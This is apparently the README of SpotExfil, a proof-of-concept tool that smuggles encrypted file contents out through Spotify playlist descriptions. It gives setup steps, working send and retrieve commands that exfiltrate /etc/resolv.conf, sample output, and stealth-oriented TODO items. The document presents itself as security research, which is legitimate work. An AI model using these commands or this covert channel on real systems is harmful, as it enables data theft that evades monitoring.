[![CodeQL](https://github.com/sourcefrenchy/spotexfil/actions/workflows/codeql-analysis.yml/badge.svg)](https://github.com/sourcefrenchy/spotexfil/actions/workflows/codeql-analysis.yml)

# SpotExfil

A proof-of-concept covert channel that exfiltrates data through Spotify playlist descriptions, 300 bytes at a time.

More info at [Exfiltration Series: SpotExfil](https://medium.com/@jeanmichel.amblat/exfiltration-series-spotexfil-9aee76382b74)

## How It Works

```
                    SPOTIFY API
                   (OAuth + REST)
                   /            \
            SENDER              RECEIVER
         (client.py)          (retrieve.py)
              |                     |
        +-----------+        +-----------+
        | File      |        | Reassemble|
        | -> BLAKE2b|        | -> Decrypt|
        | -> AES-GCM|        | -> Verify |
        | -> Base64 |        | -> Output |
        | -> Chunk  |        +-----------+
        +-----------+
```

1. **Encode**: Read file, compute BLAKE2b integrity hash, encrypt with AES-256-GCM, Base64-encode, wrap in JSON
2. **Chunk**: Split payload into 300-byte pieces (Spotify playlist description limit)
3. **Transmit**: Create private playlists with payload chunks as descriptions, add filler tracks from random artists
4. **Retrieve**: Fetch playlists, sort by index, reassemble, decrypt, verify integrity hash

## Features

- **AES-256-GCM encryption** with PBKDF2-SHA256 key derivation (480K iterations)
- **BLAKE2b integrity verification** on encode and decode
- **Random filler tracks** from a pool of artists (not a single hardcoded artist)
- **Paginated playlist handling** (no 50-playlist limit)
- **Index-based ordering** for reliable reassembly regardless of API return order
- **Legacy mode** (plaintext Base64) when no encryption key is provided

## Prerequisites

1. Register an app at [Spotify Developer Dashboard](https://developer.spotify.com/dashboard/)
2. Add your redirect URI in the app settings (e.g., `http://127.0.0.1:8888/callback`)
3. Set environment variables:

```bash
export SPOTIFY_USERNAME=YourSpotifyUsername
export SPOTIFY_CLIENT_ID=your_client_id
export SPOTIFY_CLIENT_SECRET=your_client_secret
export SPOTIFY_REDIRECTURI=http://127.0.0.1:8888/callback
```

## Installation

```bash
pip install -r requirements.txt
```

For development (tests + linting):

```bash
pip install -r requirements-dev.txt
```

## Usage

### Send (exfiltrate)

```bash
# Encrypted (recommended)
./spotexfil_client.py -f /etc/resolv.conf -k "my-secret-passphrase"

# Plaintext (legacy, no encryption)
./spotexfil_client.py -f /etc/resolv.conf
```

### Receive (retrieve)

```bash
# Decrypt and print to stdout
./spotexfil_retrieve.py -r -k "my-secret-passphrase"

# Decrypt and save to file
./spotexfil_retrieve.py -r -k "my-secret-passphrase" -o output.txt
```

### Example

```
$ ./spotexfil_client.py -f /etc/resolv.conf -k "demo-key"
[*] Data cleared (0 playlists removed)
[*] checksum plaintext 5673f6cea5b33041f92eab6f62a2b348a12f5d0d
[*] payload encrypted with AES-256-GCM
[*] Generating playlists
    [*] Created 1-payloadChunk (300 bytes)
    [*] Created 2-payloadChunk (300 bytes)
    [*] Created 3-payloadChunk (42 bytes)
[*] Data encoded and sent (3 playlists)

$ ./spotexfil_retrieve.py -r -k "demo-key"
[*] Retrieving playlists
    [*] Retrieved 1-payloadChunk
    [*] Retrieved 2-payloadChunk
    [*] Retrieved 3-payloadChunk
[*] Retrieved 3 chunks
[*] integrity verified: 5673f6cea5b33041f92eab6f62a2b348a12f5d0d
# macOS Notice
# This file is not consulted for DNS hostname resolution...
```

## Testing

```bash
# Run all tests (62 tests)
pytest tests/ -v

# Run with coverage
pytest tests/ --cov=. --cov-report=term-missing

# Lint
flake8 *.py tests/*.py
```

Test suite covers:
- **Unit tests**: BLAKE2b hashing, AES-256-GCM encrypt/decrypt, key derivation, Base64 handling
- **API tests**: Authentication, pagination, playlist CRUD (mocked Spotify API)
- **Integration tests**: Full encode-chunk-reassemble-decode roundtrips with in-memory Spotify store

## Project Structure

```
spotexfil/
├── spotexfil_client.py     # CLI: exfiltrate a file
├── spotexfil_retrieve.py   # CLI: retrieve exfiltrated data
├── spotapi.py              # Spotify API wrapper (auth, playlists, chunking)
├── encoding.py             # Encryption, encoding, integrity verification
├── requirements.txt        # Runtime dependencies
├── requirements-dev.txt    # Dev/test dependencies
├── setup.cfg               # flake8 + pytest config
└── tests/
    ├── test_encoding.py    # Unit tests for encoding/crypto
    ├── test_spotapi.py     # Mock-based API tests
    └── test_integration.py # End-to-end roundtrip tests
```

## Limitations

- **~600KB max payload** (~2000 playlists before Spotify limits)
- **Slow for large files** (1 API call per 300-byte chunk)
- **Spotify rate limits** may throttle bulk operations
- Playlist naming pattern (`N-payloadChunk`) is detectable by network analysis

## Disclaimer

This is a **proof-of-concept for educational and authorized security research purposes only**. Do not use this tool for unauthorized data exfiltration. The author is not responsible for misuse.

## TODO

- Obfuscated/randomized playlist naming for improved stealth
- Compression (gzip) for large payloads before encryption
- Account rotation support
- Real-time listener mode (chat system via `spotexfil_server.py`)
